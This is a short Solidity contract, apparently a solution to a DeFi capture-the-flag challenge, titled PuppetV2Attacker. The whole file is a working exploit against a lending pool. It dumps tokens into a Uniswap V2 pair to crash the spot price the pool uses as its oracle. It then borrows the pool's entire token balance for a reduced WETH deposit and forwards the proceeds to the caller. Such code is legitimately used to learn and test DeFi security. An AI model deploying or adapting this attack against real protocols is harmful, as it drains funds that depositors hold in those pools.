// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

interface IPuppetV2Pool {
    function calculateDepositOfWETHRequired(
        uint256 borrowAmount
    ) external view returns (uint256);

    function borrow(uint256 borrowAmount) external;
}

contract PuppetV2Attacker {
    IPuppetV2Pool public pool;
    IUniswapV2Router02 public router;
    IERC20 public token;
    IWETH public weth;

    constructor(
        address _pool,
        address _router,
        address _token,
        address _weth
    ) public {
        pool = IPuppetV2Pool(_pool);
        router = IUniswapV2Router02(_router);
        token = IERC20(_token);
        weth = IWETH(_weth);
    }

    function attack() public payable {
        token.transferFrom(
            msg.sender,
            address(this),
            token.balanceOf(msg.sender)
        );

        token.approve(address(router), token.balanceOf(address(this)));

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        router.swapExactTokensForETH(
            token.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 borrowAmount = token.balanceOf(address(pool));
        uint256 depositAmount = pool.calculateDepositOfWETHRequired(
            borrowAmount
        );

        require(depositAmount <= address(this).balance, "Insufficient balance");

        weth.deposit{value: depositAmount}();

        IERC20(address(weth)).approve(address(pool), depositAmount);

        pool.borrow(borrowAmount);

        token.transfer(msg.sender, token.balanceOf(address(this)));

        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {}
}
